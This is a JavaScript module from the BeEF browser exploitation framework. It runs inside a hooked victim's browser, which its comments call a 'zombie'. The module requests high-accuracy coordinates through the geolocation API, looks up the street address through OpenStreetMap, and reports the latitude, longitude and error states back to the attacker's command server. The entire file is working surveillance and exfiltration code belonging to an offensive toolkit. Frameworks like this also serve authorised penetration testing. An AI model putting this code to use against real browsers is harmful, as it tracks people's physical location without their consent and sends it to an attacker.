//
//   Copyright 2012 Wade Alcorn wade@bindshell.net
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
//
/*!
 * @literal object: beef.geolocation
 *
 * Provides functionalities to use the geolocation API.
 */
beef.geolocation = {

    /**
     * check if browser supports the geolocation API
     */
    isGeolocationEnabled: function(){
		return !!navigator.geolocation;
    },

    /*
     * given latitude/longitude retrieves exact street position of the zombie
     */
    getOpenStreetMapAddress: function(command_url, command_id, latitude, longitude){

        // fixes damned issues with jquery 1.5, like this one:
        // http://bugs.jquery.com/ticket/8084
        $j.ajaxSetup({
            jsonp: null,
            jsonpCallback: null
        });

        $j.ajax({
            error: function(xhr, status, error){
                //console.log("[geolocation.js] openstreetmap error");
                beef.net.send(command_url, command_id, "latitude=" + latitude
                             + "&longitude=" + longitude
                             + "&osm=UNAVAILABLE"
                             + "&geoLocEnabled=True");
                },
            success: function(data, status, xhr){
                //console.log("[geolocation.js] openstreetmap success");
                var jsonResp = $j.parseJSON(data);

                beef.net.send(command_url, command_id, "latitude=" + latitude
                             + "&longitude=" + longitude
//                             + "&osm=" + encodeURI(jsonResp.display_name)
                              + "&osm=tofix"
                             + "&geoLocEnabled=True");
                },
            type: "get",
            url: "http://nominatim.openstreetmap.org/reverse?format=json&lat=" +
                latitude + "&lon=" + longitude + "&zoom=18&addressdetails=1"
        });

    },

    /*
     * retrieve latitude/longitude using the geolocation API
     */
    getGeolocation: function (command_url, command_id){

        if (!navigator.geolocation) {
	        beef.net.send(command_url, command_id, "latitude=NOT_ENABLED&longitude=NOT_ENABLED&geoLocEnabled=False");	
			return;
		}
        //console.log("[geolocation.js] navigator.geolocation.getCurrentPosition");
        navigator.geolocation.getCurrentPosition( //note: this is an async call
			function(position){ // success
				var latitude = position.coords.latitude;
        		var longitude = position.coords.longitude;
                //console.log("[geolocation.js] success getting position. latitude [%d], longitude [%d]", latitude, longitude);
                beef.geolocation.getOpenStreetMapAddress(command_url, command_id, latitude, longitude);

			}, function(error){ // failure
                    //console.log("[geolocation.js] error [%d] getting position", error.code);
					switch(error.code) // Returns 0-3
					{
						case 0:
			            	beef.net.send(command_url, command_id, "latitude=UNKNOWN_ERROR&longitude=UNKNOWN_ERROR&geoLocEnabled=False");
							return;
						case 1:
		            		beef.net.send(command_url, command_id, "latitude=PERMISSION_DENIED&longitude=PERMISSION_DENIED&geoLocEnabled=False");
							return;
						case 2:
		            		beef.net.send(command_url, command_id, "latitude=POSITION_UNAVAILABLE&longitude=POSITION_UNAVAILABLE&geoLocEnabled=False");
							return;
						case 3:
					   		beef.net.send(command_url, command_id, "latitude=TIMEOUT&longitude=TIMEOUT&geoLocEnabled=False");
							return;
					}
            	beef.net.send(command_url, command_id, "latitude=UNKNOWN_ERROR&longitude=UNKNOWN_ERROR&geoLocEnabled=False");
			},
			{enableHighAccuracy:true, maximumAge:30000, timeout:27000}
		);
    }
}


beef.regCmp('beef.geolocation');
